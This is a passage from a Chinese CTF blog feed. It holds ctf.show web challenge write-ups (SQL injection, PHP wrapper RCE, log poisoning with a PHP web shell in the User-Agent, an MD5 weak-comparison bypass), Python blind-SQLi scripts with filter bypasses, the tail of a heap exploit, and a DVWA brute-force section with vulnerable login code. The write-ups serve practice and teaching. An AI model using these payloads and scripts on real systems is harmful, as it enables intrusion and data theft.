class="number">0x80</span>)+p64(atoi_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">sh.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf.show 通关记录(1)</title>
    <url>//ctf-show01.html</url>
    <content><![CDATA[<p><a href="https://ctf.show/">ctf.show</a>平台web 1-4</p>
<a id="more"></a>



<h2 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924081327768.png" alt="image-20200924081327768"></p>
<p>一道签到题</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>打开容器</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082055850.png"></p>
<p><code>F12</code>查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">where is flag?</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">ZmxhZ3swNzc4NGQ5My04YTJkLTRmZjktYWVlYy0yMDdjMTllNTBhMmN9--&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面有一串<code>base64</code>加密的玩意</p>
<p>解密之后</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082223263.png" alt="image-20200924082223263"></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082349245.png" alt="image-20200924082349245"></p>
<p>说是一个<code>sql注入</code></p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开容器，是熟悉的登录框</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082433112.png" alt="image-20200924082433112"></p>
<p>使用万能密码试试登录</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924082707666.png" alt="image-20200924082707666"></p>
<p>成功了，说明存在<code>sql注入</code></p>
<p>爆破一下字段数量</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083134289.png" alt="image-20200924083134289"></p>
<p>字段是三个，回显是第二个</p>
<p>然后注入第二个点，得到所有的数据库名</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083320142.png" alt="image-20200924083320142"></p>
<p>然后爆出表名</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083426195.png" alt="image-20200924083426195"></p>
<p>得到列名</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083610703.png" alt="image-20200924083610703"></p>
<p>最后得到数据</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083705363.png" alt="image-20200924083705363"></p>
<p>得到了flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924083800080.png" alt="image-20200924083800080"></p>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>打开容器，发现给了部分代码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084144615.png"></p>
<p>是一个文件包含</p>
<p>使用php伪协议读取源码</p>
<p><code>?url=php://filter/convert.base64-encode/resource=index.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$url&#x3D;$_GET[&#39;url&#39;];</span><br><span class="line">if(isset($url))&#123;</span><br><span class="line">    include($url);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, minimum-scale&#x3D;1.0, maximum-scale&#x3D;1.0, initial-scale&#x3D;1.0&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web3&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web3&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">            </span><br><span class="line">            $code&#x3D;&quot;&lt;?php include($&quot;.&quot;_GET[&#39;url&#39;]);?&gt;&quot;;</span><br><span class="line">            highlight_string($code);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;&#x2F;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>好吧，也没啥玩意</p>
<p>查了一下，还有一个<code>php://input</code>伪协议可以RCE</p>
<p><code>?url=php://input</code></p>
<p>加上数据<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084649521.png" alt="image-20200924084649521"></p>
<p>得到flag</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084747712.png" alt="image-20200924084747712"></p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084855805.png" alt="image-20200924084855805"></p>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>打开容器</p>
<p>发现和web3一样</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924084938689.png" alt="image-20200924084938689"></p>
<p>但是过滤了<code>php</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085037365.png" alt="image-20200924085037365"></p>
<p>所以不能<code>php</code>伪协议了</p>
<p>后端服务器为<code>nginx</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085325509.png" alt="image-20200924085325509"></p>
<p>找一下日志文件</p>
<p><code>?url=/var/log/nginx/access.log</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085310923.png" alt="image-20200924085310923"></p>
<p>成功包含日志文件</p>
<p>在UA头插入<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085637490.png" alt="image-20200924085637490"></p>
<p>成功RCE</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085604290.png" alt="image-20200924085604290"></p>
<p>得到flag</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200924085712021.png" alt="image-20200924085712021"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ctf-show</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf.show 通关记录(2)</title>
    <url>//ctf-show02.html</url>
    <content><![CDATA[<p><a href="https://ctf.show/">ctf.show</a>平台web 5-8</p>
<a id="more"></a>



<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013185527811.png" alt="image-20201013185527811" style="zoom:50%;" />



<p>进入后给出源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, minimum-scale&#x3D;1.0, maximum-scale&#x3D;1.0, initial-scale&#x3D;1.0&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;&#x2F;center&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $flag&#x3D;&quot;&quot;;</span><br><span class="line">        $v1&#x3D;$_GET[&#39;v1&#39;];</span><br><span class="line">        $v2&#x3D;$_GET[&#39;v2&#39;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)&#x3D;&#x3D;md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>弱类型 + 0e md5</p>
<p><a href="https://www.cnblogs.com/Oran9e/p/6537204.html">参考资料</a></p>
<p><code>?v2=240610708&amp;v1=QNKCDZO</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013190453623.png" alt="image-20201013190453623"></p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191532526.png" alt="image-20201013191532526" style="zoom:50%;" />



<p>打开之后是熟悉的登录框</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191620597.png" alt="image-20201013191620597"></p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><ol>
<li><p>尝试万能密码，登录成功</p>
</li>
<li><p>尝试union 联合注入，发现空格被过滤</p>
</li>
<li><p>尝试使用/**1**/，绕过空格，发现注入成功</p>
</li>
</ol>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191746533.png" alt="image-20201013191746533"></p>
<p>根据上述，写出exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://69696014-1b18-4d83-8fa9-37db705f4987.chall.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();#&quot;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27;;#&quot;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27; union select 1,group_concat(flag),3 from flag;#&quot;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**1**/&quot;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: sql,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>



<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191847924.png" style="zoom:50%;" />

<p>打开之后是一个目录</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191927234.png" alt="image-20201013191927234"></p>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>f12查看源代码，观察到存在<code>id</code>参数，可能存在注入</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013192001690.png" alt="image-20201013192001690"></p>
<p>尝试<code>?id=1&#39;or 1=1#</code>失败，被检测出sql注入</p>
<p>尝试使用<code>/**1**/</code>绕过空格，发现成功，但是由于没有回显，不能使用联合注入</p>
<p>尝试布尔盲注<code>?id=1/**1**/or/**1**/1=1</code>，成功</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013192451766.png" alt="image-20201013192451766"></p>
<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5ebd5a1c-14f2-4ba8-bcb4-8b2faaa6182a.chall.ctf.show/index.php?id=1 and &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        sql = <span class="string">&quot;&quot;</span> \</span><br><span class="line">              <span class="string">&quot;((&quot;</span> \</span><br><span class="line">              <span class="string">&quot;select length(group_concat(table_name)) &quot;</span> \</span><br><span class="line">              <span class="string">&quot;from information_schema.tables &quot;</span> \</span><br><span class="line">              <span class="string">&quot;where table_schema=database()&quot;</span> \</span><br><span class="line">              <span class="string">&quot;)=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line"></span><br><span class="line">        uri = url + sql</span><br><span class="line">        uri = uri.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**1**/&quot;</span>)</span><br><span class="line">        res = requests.get(url=uri)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">&quot;length: &quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span>(<span class="params">length: <span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            k = <span class="built_in">ord</span>(j)</span><br><span class="line">            sql = <span class="string">&quot;((&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;select ascii(substr(&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;(select group_concat(table_name) &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from information_schema.tables &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;where table_schema=database())&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;,&#123;0&#125;,1)&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;))=&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i, k)</span><br><span class="line">            <span class="comment"># print(sql)</span></span><br><span class="line">            uri = url + sql</span><br><span class="line">            uri = uri.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&quot;/**1**/&quot;</span>)</span><br><span class="line">            res = requests.get(url=uri)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                print(j, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># exit(-1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># getLength()</span></span><br><span class="line">    getData(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>改变其中<code>getData和getLength中的sql语句就可以实现布尔盲注</code></p>
<p>（过滤的替代函数/符号 之后单独写一篇文章）</p>
<h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013194156596.png" alt="image-20201013194156596"></p>
<p>打开之后和上题一样，是一个盲注</p>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>但是这次过滤了逗号，所以不能用<code>substr</code>函数了，替代品为<code>substring(xxx from 1)</code>用于截断结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f677e55a-8e9d-45f6-9b48-1e3282696b60.chall.ctf.show/index.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passby</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; str:</span></span><br><span class="line">    payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**a**/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>():</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./sql_fuzz&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        payload = i[:-<span class="number">1</span>]</span><br><span class="line">        uri = url + payload</span><br><span class="line">        res = requests.get(url=uri)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;sql&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        sql = <span class="string">&quot;((&quot;</span> \</span><br><span class="line">              <span class="string">&quot;select length(group_concat(flag)) &quot;</span> \</span><br><span class="line">              <span class="string">&quot;from flag &quot;</span> \</span><br><span class="line">              <span class="string">&quot;)=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        sql = passby(sql)</span><br><span class="line">        uri = url + sql</span><br><span class="line">        res = requests.get(url=uri)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(sql)</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakData</span>(<span class="params">length: <span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> string.printable:</span><br><span class="line">            payload = <span class="built_in">ord</span>(payload)</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            sql = <span class="string">&quot;((&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;select ascii(substring(&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;(select group_concat(flag) &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from flag) &quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from &#123;0&#125;)&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;))=&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i, payload)</span><br><span class="line">            <span class="comment"># print(sql)</span></span><br><span class="line">            sql = passby(sql)</span><br><span class="line"></span><br><span class="line">            uri = url + sql</span><br><span class="line">            res = requests.get(url=uri)</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                print(<span class="built_in">chr</span>(payload), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># fuzz()</span></span><br><span class="line">    <span class="comment"># leakLength()</span></span><br><span class="line">    leakData(<span class="number">42</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ctf-show</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa-brute-force</title>
    <url>//brute-force.html</url>
    <content><![CDATA[<p>dvwa靶场的暴力破解部分</p>
<p>暴力破解取决于密码本</p>
<p>好用的密码本事半功倍</p>
<a id="more"></a>



<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>甚至可以sql注入。</p>
<p>在页面抓包之后选择<code>send to Intruder</code></p>
<img src="dvwa-brute-force/image-20200721101658090.png" alt="image-20200721101658090" style="zoom:50%;" />

<p>然后在<code>position</code>界面password地方增加标记，其他的标记清除</p>
<img src="dvwa-brute-force/image-20200721102030788.png" alt="image-20200721102030788" style="zoom:50%;" />

<p>前往payload界面，选择<code>payloads</code>，start attack即可</p>
<img src="dvwa-brute-force/image-20200721102153217.png" alt="image-20200721102153217" style="zoom:50%;" />

<p>发现一个返回长度不一样</p>
<img src="dvwa-brute-force/image-20200721102255259.png" alt="image-20200721102255259" style="zoom:50%;" />

<p>尝试登陆，成功</p>
<img src="dvwa-brute-force/image-20200721102315065.png" alt="image-20200721102315065" style="zoom:50%;" />



<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span 